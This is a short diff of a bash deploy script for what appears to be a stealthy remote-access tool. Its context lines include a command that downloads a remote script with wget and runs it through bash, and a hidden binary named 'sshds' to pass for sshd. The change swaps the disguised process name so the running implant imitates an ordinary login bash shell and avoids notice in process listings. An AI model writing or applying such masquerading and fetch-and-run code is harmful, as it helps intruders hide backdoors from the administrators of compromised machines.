@@ -57,7 +57,7 @@ DL_WGT="bash -c \"\$(wget -qO- $URL_DEPLOY)\""
 BIN_HIDDEN_NAME_DEFAULT="sshds"
 # Can not use '[kcached/0]'. Bash without bashrc shows "/0] $" as prompt. 
 whoiam="$(whoami)"
-proc_name_arr=("sshd: $whoiam [priv]")
+proc_name_arr=("-bash HOSTTYPE=$HOSTTYPE LANG=$LANG PATH=$PATH")
 # Pick a process name at random
 PROC_HIDDEN_NAME_DEFAULT="${proc_name_arr[$((RANDOM % ${#proc_name_arr[@]}))]}"
 for str in "${proc_name_arr[@]}"; do
